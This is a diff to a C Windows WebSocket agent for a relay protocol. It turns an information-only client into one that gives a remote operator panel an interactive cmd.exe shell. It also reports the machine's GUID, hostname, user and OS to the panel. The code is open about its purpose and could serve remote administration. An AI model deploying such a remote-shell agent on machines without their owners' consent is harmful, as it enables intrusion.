@@ -1,11 +1,15 @@
-/* relay_client - a minimal information-only agent for Windows (WinHTTP, 8+).
+/* relay_client - a minimal agent for Windows (WinHTTP, 8+).
  *
  * A "minimal agent" in the relay protocol is anything that answers the
  * operator panel's Hello command with a 750-byte identity frame. Everything
  * else (file browsing, shells, screenshots) is optional and advertised - or
- * deliberately not advertised - via the capability mask. This agent
- * advertises nothing: the panel shows its device information and offers no
- * remote-control UI. An honest, information-only agent.
+ * deliberately not advertised - via the capability mask.
+ *
+ * This agent implements the Shell category (mask bit 1): the panel opens a
+ * terminal window whose commands run in a local cmd.exe, and their output
+ * streams back. One side effect of advertising Shell without FileSystem:
+ * the panel's file manager falls back to its PowerShell-over-shell backend,
+ * so a basic file browser comes for free.
  *
  * Lifecycle:
  *   [1] connect: session -> connection -> HTTP GET -> 101 upgrade -> socket
@@ -13,307 +17,35 @@
  *   [3] shutdown: close the WebSocket cleanly and release handles
  *
  * Build (MinGW gcc):
- *   gcc -O2 -s -Wall -Wextra -o relay_client.exe relay_client.c -lwinhttp -ladvapi32
+ *   gcc -O2 -s -Wall -Wextra -o relay_client.exe relay_client.c \
+ *       transport.c shell.c report.c system_facts.c -lwinhttp -ladvapi32
  * Run:
  *   relay_client.exe <URL>        e.g. ... https://relay.example.com/agent
  *
  * The URL comes only from the command line; nothing is hardcoded.
- */
-
-/*
+ *
  * ============================================================================
- * Protocol reference (what the panel expects, byte for byte)
+ * Module map (one header = one topic)
  * ============================================================================
- *
- * Every operator command:  [1-byte opcode][command-specific payload]
- * Every agent reply:       [UINT32 LE status][reply-specific payload]
- *                          status 0 = success, non-zero = error
- *
- * Opcodes this agent will ever see:
- *   0x00 Hello - "identify yourself". Reply: identity frame (see below).
- *   0x09 Exit  - terminate the agent. The ONLY command with no reply.
- *   everything else is not implemented: reply status 1.
- *
- * The identity frame (750 bytes, all strings ASCII NUL-padded):
- *
- *   offset  size  field
- *   ------  ----  -------------------------------------------------
- *   0       4     status = 0
- *   4       16    machine UUID, .NET Guid byte order (see get_machine_uuid)
- *   20      256   hostname
- *   276     256   logged-on user name
- *   532     32    CPU architecture ("x64" / "x86")
- *   564     32    platform ("Windows")
- *   596     128   OS version ("10.0.19045")
- *   724     4     build number (display only)
- *   728     9     commit hash (8 chars + NUL, display only)
- *   737     4     API version = 4
- *   741     1     is-64-bit-process flag
- *   742     8     capability mask (8 zero bytes = nothing implemented)
- *
- * Capability mask: 8 bytes, one bit per feature category, LSB first:
- *   bit 0 = FileSystem (ListDirectory/ReadFile/HashFile)
- *   bit 1 = Shell      (Open/Write/Read/CloseShell)
- *   bit 2 = Display    (GetDisplays/GetScreenshot)
- * An all-zero mask is honored literally: the panel hides all remote-control
- * UI and shows only this agent's identity fields.
+ *   relay_client.c   this file - connect, dispatch, cleanup (main)
+ *   protocol.h       opcodes, statuses, identity frame, capability mask
+ *   wire.h           tiny little-endian writers (header-only)
+ *   transport.h/.c   the WebSocket pipe: ws_send / ws_receive
+ *   shell.h/.c       the cmd.exe pool: spawn / read / write / teardown
+ *   report.h/.c      human-facing output: errors, hex dumps, decoders
+ *   system_facts.h/.c  machine UUID + hostname/user/OS facts
  */
 
 #include <windows.h>
 #include <winhttp.h>
 #include <stdio.h>
 
-/* ==========================================================================
- * Protocol constants
- * ======================================================================== */
-
-/* Command opcodes (full table; incoming requests are decoded with it). */
-#define CMD_HELLO               0x00
-#define CMD_LIST_DIRECTORY      0x01
-#define CMD_READ_FILE           0x02
-#define CMD_HASH_FILE           0x03
-#define CMD_WRITE_SHELL         0x04
-#define CMD_READ_SHELL          0x05
-#define CMD_GET_DISPLAYS        0x06
-#define CMD_GET_SCREENSHOT      0x07
-#define CMD_CLOSE_SHELL         0x08
-#define CMD_EXIT                0x09
-#define CMD_OPEN_SHELL          0x0A
-
-/* Reply status codes. */
-#define STATUS_OK               0
-#define STATUS_ERROR            1
-
-/* Identity ("Hello") frame - field widths from the protocol table above. */
-#define IDENTITY_FRAME_SIZE     750
-#define ID_HOSTNAME_SIZE        256
-#define ID_USERNAME_SIZE        256
-#define ID_ARCH_SIZE            32
-#define ID_PLATFORM_SIZE        32
-#define ID_OS_VERSION_SIZE      128
-#define ID_COMMIT_HASH_SIZE     9      /* 8 chars + NUL            */
-#define ID_API_VERSION          4      /* v4 = current framing     */
-#define ID_BUILD_NUMBER         1      /* display-only build tag   */
-
-/* Capability mask: zero = information-only agent, no remote control. */
-#define CAPABILITY_MASK         0
-
-/* ==========================================================================
- * Buffers and output limits
- * ======================================================================== */
-
-/* One WinHttpWebSocketReceive call returns ONE fragment; 64 KB matches what
- * real agents use (a shorter buffer would fail on large fragments). */
-#define RECV_FRAGMENT_SIZE      65536
-
-/* Commands are short; anything longer is kept up to this size and flagged. */
-#define MAX_MESSAGE_SIZE        8192
-
-/* Bytes of each message shown in the hex dump (keeps output readable). */
-#define HEXDUMP_LIMIT           64
-
-/* ==========================================================================
- * Diagnostics
- * ======================================================================== */
-
-/* ---------------------------------------------------------------------------
- * print_error_code - human-readable text for an explicit WinAPI error code.
- *
- * Why an explicit code parameter? The WinHttpWebSocket* family returns the
- * error code directly (DWORD), unlike classic WinHTTP which returns BOOL and
- * leaves the code in GetLastError(). One helper serves both families.
- * ------------------------------------------------------------------------- */
-static void print_error_code(const char *step, DWORD err)
-{
-    char msg[512] = {0};
-
-    /* System codes come from the OS table; WinHTTP codes (>= 12000) live in
-     * winhttp.dll's own message table. */
-    DWORD flags = FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;
-    HMODULE winhttp = NULL;
-    if (err >= 12000) {                 /* WINHTTP_ERROR_BASE */
-        winhttp = GetModuleHandleW(L"winhttp.dll");
-        if (winhttp)
-            flags |= FORMAT_MESSAGE_FROM_HMODULE;
-    }
-
-    DWORD len = FormatMessageA(flags, winhttp, err, 0, msg, sizeof(msg), NULL);
-    while (len > 0 && (msg[len-1] == '\n' || msg[len-1] == '\r' ||
-                       msg[len-1] == ' '))
-        msg[--len] = '\0';
-
-    if (len > 0)
-        fprintf(stderr, "[!] %s: error %lu - %s\n", step, err, msg);
-    else
-        fprintf(stderr, "[!] %s: error %lu\n", step, err);
-}
-
-/* ---------------------------------------------------------------------------
- * ws_buffer_type_name - WinHTTP's WebSocket buffer type, as a string.
- * WinHTTP does not expose RFC 6455 frame opcodes; this enum is the only
- * "type" the application ever sees (ping/pong is handled internally).
- * ------------------------------------------------------------------------- */
-static const char *ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type)
-{
-    switch (type) {
-    case WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE:  return "binary-message";
-    case WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE: return "binary-fragment";
-    case WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE:    return "utf8-message";
-    case WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE:   return "utf8-fragment";
-    case WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE:           return "close";
-    default:                                             return "unknown";
-    }
-}
-
-/* ---------------------------------------------------------------------------
- * command_name - the relay-protocol name of an incoming command opcode.
- * ------------------------------------------------------------------------- */
-static const char *command_name(unsigned char opcode)
-{
-    switch (opcode) {
-    case CMD_HELLO:            return "Hello";
-    case CMD_LIST_DIRECTORY:   return "ListDirectory";
-    case CMD_READ_FILE:        return "ReadFile";
-    case CMD_HASH_FILE:        return "HashFile";
-    case CMD_WRITE_SHELL:      return "WriteShell";
-    case CMD_READ_SHELL:       return "ReadShell";
-    case CMD_GET_DISPLAYS:     return "GetDisplays";
-    case CMD_GET_SCREENSHOT:   return "GetScreenshot";
-    case CMD_CLOSE_SHELL:      return "CloseShell";
-    case CMD_EXIT:             return "Exit";
-    case CMD_OPEN_SHELL:       return "OpenShell";
-    default:                   return "unknown";
-    }
-}
-
-/* ==========================================================================
- * Wire-format writers (everything on the wire is little-endian)
- * ======================================================================== */
-
-static void write_u32_le(unsigned char *buf, int *pos, unsigned value)
-{
-    for (int i = 0; i < 4; i++)
-        buf[(*pos)++] = (unsigned char)(value >> (8 * i));
-}
-
-static void write_u64_le(unsigned char *buf, int *pos,
-                         unsigned long long value)
-{
-    for (int i = 0; i < 8; i++)
-        buf[(*pos)++] = (unsigned char)(value >> (8 * i));
-}
-
-/* Write an ASCII string into a fixed-width, NUL-padded protocol field.
- * The frame is pre-zeroed by the caller, so only string + NUL are written
- * and the remaining bytes of the field stay zero. */
-static void write_ascii_field(unsigned char *buf, int *pos,
-                              const char *s, int width)
-{
-    int start = *pos;
-    int i = 0;
-    while (s[i] != '\0' && i < width - 1) {
-        buf[start + i] = (unsigned char)s[i];
-        i++;
-    }
-    buf[start + i] = '\0';
-    *pos = start + width;
-}
-
-/* ==========================================================================
- * System facts (what this agent reports about its machine)
- * ======================================================================== */
-
-/* Get the machine UUID from HKLM\...\Cryptography\MachineGuid, converted to
- * the .NET Guid byte order the panel expects. Falls back to all zeros.
- *
- * The registry stores the UUID as text ("00112233-4455-6677-..."); the
- * panel parses the 16 frame bytes as a .NET Guid, whose first three groups
- * (Data1..Data3) are little-endian and whose last group is raw. Hence the
- * reorder at the end: string order -> 33 22 11 00 | 55 44 | 77 66 | raw. */
-static void get_machine_uuid(unsigned char out[16])
-{
-    char text[64] = {0};
-    DWORD size = sizeof(text) - 1;
-
-    HKEY key;
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography",
-                      0, KEY_QUERY_VALUE, &key) == ERROR_SUCCESS) {
-        DWORD type = 0;
-        if (RegQueryValueExA(key, "MachineGuid", NULL, &type,
-                             (LPBYTE)text, &size) != ERROR_SUCCESS ||
-            type != REG_SZ)
-            text[0] = '\0';
-        RegCloseKey(key);
-    }
-
-    /* Hex digits (skipping '-', '{', '}') -> 16 bytes in string order. */
-    unsigned char straight[16];
-    int digits = 0;
-    for (const char *p = text; *p != '\0' && digits < 32; p++) {
-        int v;
-        if (*p >= '0' && *p <= '9')      v = *p - '0';
-        else if (*p >= 'a' && *p <= 'f') v = *p - 'a' + 10;
-        else if (*p >= 'A' && *p <= 'F') v = *p - 'A' + 10;
-        else continue;
-        straight[digits / 2] = (unsigned char)((digits % 2 == 0)
-                                ? (v << 4) : (straight[digits / 2] | v));
-        digits++;
-    }
-    if (digits != 32) {
-        ZeroMemory(out, 16);             /* malformed or missing -> zeros */
-        return;
-    }
-
-    /* String byte order -> .NET Guid layout (Data1..3 LE, Data4 raw). */
-    out[0] = straight[3];  out[1] = straight[2];
-    out[2] = straight[1];  out[3] = straight[0];
-    out[4] = straight[5];  out[5] = straight[4];
-    out[6] = straight[7];  out[7] = straight[6];
-    for (int i = 0; i < 8; i++)
-        out[8 + i] = straight[8 + i];
-}
-
-/* Everything the identity frame needs to know about the machine. */
-typedef struct {
-    char hostname[ID_HOSTNAME_SIZE];
-    char username[ID_USERNAME_SIZE];
-    char os_version[ID_OS_VERSION_SIZE];
-} system_facts;
-
-static void collect_system_facts(system_facts *facts)
-{
-    ZeroMemory(facts, sizeof(*facts));
-
-    DWORD n = sizeof(facts->hostname);
-    GetComputerNameA(facts->hostname, &n);       /* kernel32 */
-
-    n = sizeof(facts->username);
-    GetUserNameA(facts->username, &n);           /* advapi32 */
-
-    /* RtlGetVersion (ntdll) reports the true OS version; the classic
-     * GetVersionEx lies to apps without a compatibility manifest. */
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    if (ntdll) {
-        /* GetProcAddress cast: the documented idiom for obtaining a typed
-         * function pointer; -Wcast-function-type cannot verify signatures,
-         * so it is suppressed for exactly this cast. */
-#pragma GCC diagnostic push
-#pragma GCC diagnostic ignored "-Wcast-function-type"
-        LONG (WINAPI *rtl_get_version)(LPOSVERSIONINFOW) =
-            (LONG (WINAPI *)(LPOSVERSIONINFOW))
-                GetProcAddress(ntdll, "RtlGetVersion");
-#pragma GCC diagnostic pop
-        if (rtl_get_version) {
-            OSVERSIONINFOW info;
-            ZeroMemory(&info, sizeof(info));
-            info.dwOSVersionInfoSize = sizeof(info);
-            if (rtl_get_version(&info) == 0)
-                snprintf(facts->os_version, sizeof(facts->os_version),
-                         "%lu.%lu.%lu", info.dwMajorVersion,
-                         info.dwMinorVersion, info.dwBuildNumber);
-        }
-    }
-}
+#include "protocol.h"
+#include "wire.h"
+#include "transport.h"
+#include "shell.h"
+#include "report.h"
+#include "system_facts.h"
 
 /* ==========================================================================
  * The identity frame (the reply to Hello)
@@ -351,237 +83,150 @@ static int build_identity_frame(unsigned char frame[IDENTITY_FRAME_SIZE],
     return pos;    /* == IDENTITY_FRAME_SIZE */
 }
 
-/* Print the outgoing identity frame field by field (the mirror of
- * print_command: everything WE send is shown too, not just what we get). */
-static void hex_dump(const unsigned char *data, DWORD length);
+/* ==========================================================================
+ * Command handlers (one reply per request, except Exit)
+ * ======================================================================== */
 
-static void print_identity_frame(const unsigned char frame[IDENTITY_FRAME_SIZE],
-                                 int frame_len)
+/* Reply to Hello: collect facts, build the frame, send it, show it. */
+static DWORD handle_hello(HINTERNET socket)
 {
-    /* Numeric fields, little-endian. */
-    unsigned status = frame[0]  | (frame[1]  << 8) |
-                      (frame[2] << 16) | ((unsigned)frame[3]  << 24);
-    unsigned build  = frame[724]| (frame[725] << 8) |
-                      (frame[726]<< 16) | ((unsigned)frame[727] << 24);
-    unsigned api    = frame[737]| (frame[738] << 8) |
-                      (frame[739]<< 16) | ((unsigned)frame[740] << 24);
-    unsigned is64   = frame[741];
+    system_facts facts;
+    collect_system_facts(&facts);
 
-    printf("[<] Identity frame (%d bytes):\n", frame_len);
-    printf("    status  = %u\n", status);
-    printf("    uuid    = ");
-    for (int i = 0; i < 16; i++) {
-        printf("%02x", frame[4 + i]);
-        if (i == 3 || i == 5 || i == 7 || i == 9) putchar('-');
-    }
-    printf("  (machine, .NET Guid order)\n");
-    printf("    host    = \"%s\"\n", (const char *)(frame + 20));
-    printf("    user    = \"%s\"\n", (const char *)(frame + 276));
-    printf("    arch    = \"%s\"\n", (const char *)(frame + 532));
-    printf("    platform= \"%s\"\n", (const char *)(frame + 564));
-    printf("    os      = \"%s\"\n", (const char *)(frame + 596));
-    printf("    build   = %u, commit = \"%s\", api = %u, 64-bit = %u\n",
-           build, (const char *)(frame + 728), api, is64);
-    printf("    mask    = ");
-    for (int i = 0; i < 8; i++)
-        printf("%02x ", frame[742 + i]);
-    printf(" (0 = information-only)\n");
+    unsigned char frame[IDENTITY_FRAME_SIZE];
+    int frame_len = build_identity_frame(frame, &facts);
 
-    DWORD dump_len = (frame_len < HEXDUMP_LIMIT) ? (DWORD)frame_len
-                                                 : HEXDUMP_LIMIT;
-    hex_dump(frame, dump_len);
-    if ((DWORD)frame_len > dump_len)
-        printf("    ... (%d more bytes not dumped)\n", frame_len - (int)dump_len);
-
+    DWORD err = ws_send(socket, frame, (DWORD)frame_len);
+    if (err != NO_ERROR)
+        return err;
+    printf("[+] identity sent to the panel (%d bytes)\n", frame_len);
+    print_identity_frame(frame, frame_len);
     fflush(stdout);
+    return NO_ERROR;
 }
 
-/* ==========================================================================
- * Transport: send one reply / receive one command
- * ======================================================================== */
-
-/* Send one binary reply. Returns the WinHTTP error code (0 = success). */
-static DWORD ws_send(HINTERNET socket, const void *data, DWORD length)
+/* OpenShell: find a free pool slot (the slot index IS the shell id). */
+static DWORD handle_open_shell(HINTERNET socket)
 {
-    return WinHttpWebSocketSend(socket,
-                                WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
-                                (PVOID)data, length);
+    int id = shell_open();
+
+    DWORD err;
+    if (id < 0) {
+        unsigned char status_error[4] = {1, 0, 0, 0};
+        err = ws_send(socket, status_error, sizeof(status_error));
+        printf("[i] OpenShell failed - replied status 1\n");
+    } else {
+        /* Exactly 12 bytes: the panel reads the id only when the
+         * reply is at least this long, else it assumes id 0. */
+        unsigned char reply[12];
+        int pos = 0;
+        write_u32_le(reply, &pos, STATUS_OK);
+        write_u64_le(reply, &pos, (unsigned long long)id);
+        err = ws_send(socket, reply, sizeof(reply));
+        printf("[+] shell %d opened (cmd.exe spawned) - id sent\n", id);
+    }
+    fflush(stdout);
+    return err;
 }
 
-/* One assembled incoming message. */
-typedef struct {
-    unsigned char data[MAX_MESSAGE_SIZE];
-    DWORD length;
-    BOOL truncated;               /* message exceeded MAX_MESSAGE_SIZE */
-    WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
-} incoming_message;
-
-/* ---------------------------------------------------------------------------
- * ws_receive - receive and assemble one complete WebSocket message.
- *
- * One WinHttpWebSocketReceive call yields one fragment; a message may span
- * several, and the last fragment carries the *_MESSAGE type. Returns the
- * WinHTTP error code (0 = success). If the server sent a close frame, the
- * return is 0 and *closed is set; the caller decides what to do.
- * ------------------------------------------------------------------------- */
-static DWORD ws_receive(HINTERNET socket, incoming_message *msg, BOOL *closed)
+/* WriteShell: [shellId:8][UTF-8 input + NUL]. The panel already appends
+ * "\n" to commands - appending another newline would execute every
+ * command twice. */
+static DWORD handle_write_shell(HINTERNET socket, const incoming_message *msg)
 {
-    ZeroMemory(msg, sizeof(*msg));
-    *closed = FALSE;
+    unsigned long long id = 0;
+    for (int i = 8; i >= 1; i--)
+        id = (id << 8) | msg->data[i];
 
-    for (;;) {
-        unsigned char fragment[RECV_FRAGMENT_SIZE];
-        DWORD got = 0;
-        WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
-
-        DWORD err = WinHttpWebSocketReceive(socket, fragment,
-                                            sizeof(fragment), &got, &type);
-        if (err != NO_ERROR)
-            return err;
-
-        if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) {
-            *closed = TRUE;
-            return NO_ERROR;
-        }
-
-        if (got > 0) {
-            if (msg->length + got <= MAX_MESSAGE_SIZE) {
-                CopyMemory(msg->data + msg->length, fragment, got);
-                msg->length += got;
-            } else {
-                msg->truncated = TRUE;   /* keep the first MAX_MESSAGE_SIZE */
-            }
-        }
-
-        if (type == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE ||
-            type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) {
-            msg->type = type;
-            return NO_ERROR;             /* message complete */
-        }
-    }
-}
-
-/* ==========================================================================
- * Printing an incoming command (for the human watching the terminal)
- * ======================================================================== */
-
-/* Classic 16-bytes-per-line hex dump with an ASCII column. */
-static void hex_dump(const unsigned char *data, DWORD length)
-{
-    for (DWORD row = 0; row < length; row += 16) {
-        printf("    %04lx  ", row);
-        for (DWORD i = 0; i < 16; i++) {
-            if (row + i < length)
-                printf("%02x ", data[row + i]);
-            else
-                printf("   ");
-            if (i == 7)
-                putchar(' ');
-        }
-        printf(" |");
-        for (DWORD i = 0; i < 16 && row + i < length; i++) {
-            unsigned char c = data[row + i];
-            putchar((c >= 0x20 && c < 0x7f) ? c : '.');
-        }
-        printf("|\n");
-    }
-}
-
-/* Decode the command-specific part (everything after the 1-byte opcode) so
- * the terminal says WHAT the panel asked for, not just raw bytes. */
-static void describe_command_payload(unsigned char opcode,
-                                     const unsigned char *p, DWORD len)
-{
-    if (len == 0) {
-        printf("    payload: (empty)\n");
-        return;
+    shell_slot *slot = shell_lookup(id);
+    int status = STATUS_ERROR;
+    if (slot) {
+        /* Strip trailing NUL(s); "\x03" passes through as Ctrl+C. */
+        DWORD end = msg->length;
+        while (end > 9 && msg->data[end - 1] == '\0')
+            end--;
+        if (end > 9 && shell_write(slot, msg->data + 9, end - 9) == 0)
+            status = STATUS_OK;
     }
 
-    switch (opcode) {
-    case CMD_LIST_DIRECTORY:            /* UTF-16LE path + NUL */
-    case CMD_HASH_FILE: {
-        printf("    payload: path = \"");
-        for (DWORD i = 0; i + 1 < len; i += 2) {
-            unsigned char lo = p[i], hi = (i + 1 < len) ? p[i+1] : 0;
-            unsigned short wc = (unsigned short)(lo | (hi << 8));
-            if (wc == 0) break;         /* NUL terminator */
-            putchar((wc >= 0x20 && wc < 0x7f) ? wc : '.');
-        }
-        printf("\"\n");
-        break;
-    }
-    case CMD_READ_FILE: {               /* u64 size, u64 offset, then path */
-        if (len >= 16) {
-            unsigned long long size = 0, offset = 0;
-            for (int i = 7; i >= 0; i--)   size   = (size   << 8) | p[i];
-            for (int i = 15; i >= 8; i--) offset = (offset << 8) | p[i];
-            printf("    payload: size = %llu, offset = %llu, path = \"",
-                   size, offset);
-            for (DWORD i = 16; i + 1 < len; i += 2) {
-                unsigned short wc = (unsigned short)(p[i] | (p[i+1] << 8));
-                if (wc == 0) break;
-                putchar((wc >= 0x20 && wc < 0x7f) ? wc : '.');
-            }
-            printf("\"\n");
-        } else {
-            printf("    payload: (too short for ReadFile)\n");
-        }
-        break;
-    }
-    case CMD_GET_SCREENSHOT: {          /* u32 display, u32 quality, u32 full */
-        if (len >= 12) {
-            printf("    payload: display = %u, quality = %u, fullscreen = %u\n",
-                   (unsigned)(p[0] | (p[1] << 8) | (p[2] << 16) |
-                              ((unsigned)p[3] << 24)),
-                   (unsigned)(p[4] | (p[5] << 8) | (p[6] << 16) |
-                              ((unsigned)p[7] << 24)),
-                   (unsigned)(p[8] | (p[9] << 8) | (p[10] << 16) |
-                              ((unsigned)p[11] << 24)));
-        } else {
-            printf("    payload: (too short for GetScreenshot)\n");
-        }
-        break;
-    }
-    default:
-        printf("    payload: (%lu bytes, see hex dump above)\n", len);
-        break;
-    }
-}
-
-/* Print one received command: header, decoded opcode and payload, hex dump,
- * printable text. Explicit length - the payload is NOT a C string. */
-static void print_command(int index, const incoming_message *msg)
-{
-    printf("[%d] Received: type=%d (%s), len=%lu%s\n",
-           index, (int)msg->type, ws_buffer_type_name(msg->type), msg->length,
-           msg->truncated ? " [TRUNCATED]" : "");
-
-    if (msg->length == 0) {
+    unsigned char reply[4] = {0, 0, 0, 0};
+    reply[0] = (unsigned char)status;
+    DWORD err = ws_send(socket, reply, sizeof(reply));
+    if (err == NO_ERROR) {
+        printf("[%s] write to shell %llu - status %d\n",
+               slot ? "+" : "!", id, status);
         fflush(stdout);
-        return;
+    }
+    return err;
+}
+
+/* ReadShell: drain what the shell has buffered. An empty chunk is legal
+ * (that is "idle"); a dead shell reports status 1. */
+static DWORD handle_read_shell(HINTERNET socket, const incoming_message *msg)
+{
+    unsigned long long id = 0;
+    for (int i = 8; i >= 1; i--)
+        id = (id << 8) | msg->data[i];
+
+    shell_slot *slot = shell_lookup(id);
+    unsigned char status_error[4] = {1, 0, 0, 0};
+    DWORD err;
+
+    if (!slot) {
+        err = ws_send(socket, status_error, sizeof(status_error));
+        if (err == NO_ERROR)
+            printf("[!] read shell %llu - unknown id, status 1\n", id);
+    } else {
+        static unsigned char chunk[4 + SHELL_READ_CHUNK + 1];
+        DWORD got = 0;
+        int r = shell_read(slot, chunk + 4, SHELL_READ_CHUNK, &got);
+
+        if (r == SHELL_READ_DEAD) {
+            err = ws_send(socket, status_error, sizeof(status_error));
+            if (err == NO_ERROR)
+                printf("[!] shell %llu exited - status 1, slot freed\n",
+                       id);
+        } else {
+            /* [status:4][chunk][NUL] - the NUL terminator is part of the
+             * v4 contract and is written explicitly (the panel strips
+             * exactly one). An empty chunk = "idle". */
+            int pos = 0;
+            write_u32_le(chunk, &pos, STATUS_OK);
+            chunk[4 + got] = '\0';
+            err = ws_send(socket, chunk, 4 + got + 1);
+            if (err == NO_ERROR) {
+                if (r == SHELL_READ_IDLE)
+                    printf("[i] read shell %llu - idle\n", id);
+                else
+                    printf("[+] read shell %llu - %lu byte(s)\n",
+                           id, got);
+            }
+        }
+    }
+    fflush(stdout);
+    return err;
+}
+
+/* CloseShell: "close and forget" - unknown ids still get status 0. */
+static DWORD handle_close_shell(HINTERNET socket, const incoming_message *msg)
+{
+    unsigned long long id = 0;
+    for (int i = 8; i >= 1; i--)
+        id = (id << 8) | msg->data[i];
+
+    shell_slot *slot = shell_lookup(id);
+    if (slot) {
+        shell_teardown(slot);
+        printf("[+] shell %llu closed (cmd.exe terminated)\n", id);
+    } else {
+        printf("[i] close shell %llu - not open (still ok)\n", id);
     }
 
-    unsigned char opcode = msg->data[0];
-    printf("    command: 0x%02x - %s\n", opcode, command_name(opcode));
-    describe_command_payload(opcode, msg->data + 1, msg->length - 1);
-
-    DWORD dump_len = (msg->length < HEXDUMP_LIMIT) ? msg->length
-                                                   : HEXDUMP_LIMIT;
-    hex_dump(msg->data, dump_len);
-    if (msg->length > dump_len)
-        printf("    ... (%lu more bytes not dumped)\n", msg->length - dump_len);
-
-    printf("    text: \"");
-    for (DWORD i = 0; i < msg->length; i++) {
-        unsigned char c = msg->data[i];
-        putchar((c >= 0x20 && c < 0x7f) ? c : '.');
-    }
-    printf("\"\n");
-
-    if (opcode == CMD_HELLO)
-        printf("[+] panel asks: who are you? (Hello)\n");
-
-    fflush(stdout);                     /* show the message at once */
+    unsigned char reply[4] = {0, 0, 0, 0};
+    DWORD err = ws_send(socket, reply, sizeof(reply));
+    if (err == NO_ERROR)
+        fflush(stdout);
+    return err;
 }
 
 /* ==========================================================================
@@ -685,10 +330,9 @@ int main(int argc, char *argv[])
     request = NULL;
     printf("connected (HTTP 101 Switching Protocols)\n");
 
-    /* ----- Stage 4: serve commands (the minimal-agent contract).
-     * Every request gets exactly one reply - except Exit, which gets none
-     * and terminates the agent. ----- */
-    printf("[2] Agent mode: replying to commands (capability mask = 0)...\n");
+    /* ----- Stage 4: serve commands. Every request gets exactly one reply
+     * - except Exit, which gets none and terminates the agent. ----- */
+    printf("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
     for (int index = 1; ; index++) {
         incoming_message msg;
         BOOL closed = FALSE;
@@ -715,30 +359,27 @@ int main(int argc, char *argv[])
         }
 
         if (opcode == CMD_HELLO && msg.length == 1) {
-            system_facts facts;
-            collect_system_facts(&facts);
-
-            unsigned char frame[IDENTITY_FRAME_SIZE];
-            int frame_len = build_identity_frame(frame, &facts);
-
-            err = ws_send(socket, frame, (DWORD)frame_len);
-            if (err != NO_ERROR) {
-                print_error_code("WinHttpWebSocketSend(identity frame)", err);
-                goto cleanup;
-            }
-            printf("[+] identity sent to the panel (%d bytes)\n", frame_len);
-            print_identity_frame(frame, frame_len);
-            fflush(stdout);
+            err = handle_hello(socket);
+        } else if (opcode == CMD_OPEN_SHELL) {
+            err = handle_open_shell(socket);
+        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 9) {
+            err = handle_write_shell(socket, &msg);
+        } else if (opcode == CMD_READ_SHELL && msg.length >= 9) {
+            err = handle_read_shell(socket, &msg);
+        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 9) {
+            err = handle_close_shell(socket, &msg);
         } else {                        /* not implemented: status = 1 */
             unsigned char status_error[4] = {1, 0, 0, 0};
             err = ws_send(socket, status_error, sizeof(status_error));
-            if (err != NO_ERROR) {
-                print_error_code("WinHttpWebSocketSend(status)", err);
-                goto cleanup;
+            if (err == NO_ERROR) {
+                printf("[i] command 0x%02x not implemented - replied status 1\n",
+                       opcode);
+                fflush(stdout);
             }
-            printf("[i] command 0x%02x not implemented - replied status 1 "
-                   "(capability mask is 0)\n", opcode);
-            fflush(stdout);
+        }
+        if (err != NO_ERROR) {
+            print_error_code("WinHttpWebSocketSend(reply)", err);
+            goto cleanup;
         }
     }
 
@@ -765,6 +406,8 @@ shutdown:
     rc = 0;
 
 cleanup:
+    /* No orphaned cmd.exe: every live shell dies with the agent. */
+    shell_teardown_all();
     if (socket)     WinHttpCloseHandle(socket);
     if (request)    WinHttpCloseHandle(request);
     if (connection) WinHttpCloseHandle(connection);
